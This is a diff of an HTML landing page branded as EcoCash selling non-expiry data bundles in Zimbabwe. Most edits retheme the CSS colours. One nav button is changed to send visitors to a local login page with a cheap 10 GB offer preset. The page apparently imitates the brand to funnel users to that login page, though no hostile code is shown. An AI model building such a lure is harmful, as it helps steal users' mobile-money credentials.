@@ -3,17 +3,17 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
-    <meta name="theme-color" content="#003d99">
+    <meta name="theme-color" content="#001a4d">
     <title>EcoCash | Non-Expiry Data Bundles · Zimbabwe</title>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
     <style>
         :root {
             --eco-red: #d32f2f;
-            --eco-blue: #003d99;
+            --eco-blue-dark: #001a4d;
+            --eco-blue: #0033a0;
             --eco-blue-light: #0052cc;
-            --eco-blue-lighter: #1a73e8;
             --white: #ffffff;
-            --light-bg: #f0f4f8;
+            --light-bg: #f5f7fa;
             --text-dark: #1a1a1a;
             --text-muted: #666666;
             --border: #e0e0e0;
@@ -42,7 +42,7 @@
             position: sticky;
             top: 0;
             z-index: 1000;
-            box-shadow: 0 2px 12px rgba(0, 61, 153, 0.12);
+            box-shadow: 0 2px 12px rgba(0, 51, 160, 0.12);
         }
 
         .logo {
@@ -77,7 +77,7 @@
         }
 
         .btn-login {
-            background: linear-gradient(135deg, var(--eco-blue), #002a6d);
+            background: linear-gradient(135deg, var(--eco-blue), var(--eco-blue-dark));
             color: white;
             padding: 10px 24px;
             border-radius: 50px;
@@ -86,17 +86,17 @@
             cursor: pointer;
             transition: all 0.2s;
             font-size: 14px;
-            box-shadow: 0 4px 12px rgba(0, 61, 153, 0.3);
+            box-shadow: 0 4px 12px rgba(0, 51, 160, 0.3);
         }
 
         .btn-login:hover {
             transform: translateY(-2px);
-            box-shadow: 0 6px 16px rgba(0, 61, 153, 0.4);
+            box-shadow: 0 6px 16px rgba(0, 51, 160, 0.4);
         }
 
         /* Hero Section */
         .hero {
-            background: linear-gradient(135deg, var(--eco-blue) 0%, #002a6d 100%);
+            background: linear-gradient(135deg, var(--eco-blue) 0%, var(--eco-blue-dark) 100%);
             color: white;
             padding: 100px 5%;
             text-align: center;
@@ -186,18 +186,18 @@
             padding: 32px;
             text-align: center;
             transition: all 0.3s;
-            box-shadow: 0 2px 8px rgba(0, 61, 153, 0.08);
+            box-shadow: 0 2px 8px rgba(0, 51, 160, 0.08);
         }
 
         .bundle-card:hover {
             border-color: var(--eco-red);
-            box-shadow: 0 12px 32px rgba(0, 61, 153, 0.15);
+            box-shadow: 0 12px 32px rgba(0, 51, 160, 0.15);
             transform: translateY(-6px);
         }
 
         .bundle-card.popular {
             border: 2px solid var(--eco-red);
-            background: linear-gradient(135deg, rgba(0, 61, 153, 0.08) 0%, rgba(211, 47, 47, 0.04) 100%);
+            background: linear-gradient(135deg, rgba(0, 51, 160, 0.08) 0%, rgba(211, 47, 47, 0.04) 100%);
         }
 
         .bundle-badge {
@@ -252,7 +252,7 @@
 
         .btn-bundle {
             width: 100%;
-            background: linear-gradient(135deg, var(--eco-blue), #002a6d);
+            background: linear-gradient(135deg, var(--eco-blue), var(--eco-blue-dark));
             color: white;
             border: none;
             padding: 14px 20px;
@@ -263,18 +263,18 @@
             letter-spacing: 0.04em;
             cursor: pointer;
             transition: all 0.2s;
-            box-shadow: 0 4px 12px rgba(0, 61, 153, 0.3);
+            box-shadow: 0 4px 12px rgba(0, 51, 160, 0.3);
         }
 
         .btn-bundle:hover {
             transform: translateY(-1px);
-            box-shadow: 0 6px 16px rgba(0, 61, 153, 0.4);
+            box-shadow: 0 6px 16px rgba(0, 51, 160, 0.4);
         }
 
         /* Steps Section */
         .steps-section {
             padding: 80px 5%;
-            background: linear-gradient(135deg, rgba(0, 61, 153, 0.08) 0%, rgba(0, 61, 153, 0.04) 100%);
+            background: linear-gradient(135deg, rgba(0, 51, 160, 0.08) 0%, rgba(0, 51, 160, 0.04) 100%);
         }
 
         .steps-grid {
@@ -290,20 +290,20 @@
             padding: 36px 28px;
             border-radius: 16px;
             text-align: center;
-            box-shadow: 0 2px 8px rgba(0, 61, 153, 0.08);
+            box-shadow: 0 2px 8px rgba(0, 51, 160, 0.08);
             border: 2px solid var(--eco-blue);
             transition: all 0.3s;
         }
 
         .step-card:hover {
-            box-shadow: 0 8px 24px rgba(0, 61, 153, 0.15);
+            box-shadow: 0 8px 24px rgba(0, 51, 160, 0.15);
             border-color: var(--eco-red);
         }
 
         .step-number {
             width: 52px;
             height: 52px;
-            background: linear-gradient(135deg, var(--eco-blue), #002a6d);
+            background: linear-gradient(135deg, var(--eco-blue), var(--eco-blue-dark));
             color: white;
             border-radius: 50%;
             display: flex;
@@ -312,7 +312,7 @@
             font-weight: 900;
             font-size: 24px;
             margin: 0 auto 16px;
-            box-shadow: 0 4px 12px rgba(0, 61, 153, 0.3);
+            box-shadow: 0 4px 12px rgba(0, 51, 160, 0.3);
         }
 
         .step-card h3 {
@@ -366,7 +366,7 @@
 
         /* Footer */
         footer {
-            background: linear-gradient(135deg, var(--eco-blue) 0%, #002a6d 100%);
+            background: linear-gradient(135deg, var(--eco-blue) 0%, var(--eco-blue-dark) 100%);
             color: white;
             padding: 60px 5%;
             border-top: 3px solid var(--eco-red);
@@ -439,14 +439,14 @@
             <a href="#bundles">Bundles</a>
             <a href="#why">Why Us</a>
             <a href="#steps">How It Works</a>
-            <button class="btn-login" onclick="window.location.href='login.html'">Login</button>
+            <button class="btn-login" onclick="window.location.href='login.html?data=10%20GB&price=1.40'">Get Started</button>
         </nav>
     </header>
 
     <section class="hero">
         <h1>Data That Never Expires</h1>
         <p>Zimbabwe's fastest and most reliable non-expiry data bundles. Buy once, use anytime.</p>
-        <a href="#bundles" class="btn-explore">🛒 Get Started</a>
+        <a href="#bundles" class="btn-explore">🛒 Explore Bundles</a>
     </section>
 
     <section class="bundles-section" id="bundles">
